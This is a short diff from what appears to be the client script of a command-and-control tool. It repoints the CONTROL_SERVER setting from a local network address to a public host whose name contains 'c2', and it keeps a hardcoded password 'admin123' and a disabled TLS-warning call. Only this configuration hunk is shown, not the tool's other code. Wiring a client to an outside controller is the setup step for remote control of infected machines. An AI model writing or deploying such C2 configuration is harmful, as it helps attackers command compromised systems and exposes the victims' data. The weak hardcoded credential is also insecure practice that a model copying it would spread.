@@ -23,7 +23,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ============================================
 # CONFIGURATION - EDIT THIS!
 # ============================================
-CONTROL_SERVER = "http://192.168.8.38:5000"  # Your server URL
+CONTROL_SERVER = "https://c2-server-io.onrender.com"  # Your server URL
 SERVER_PASSWORD = "admin123"                  # Match server password
 # ============================================
 
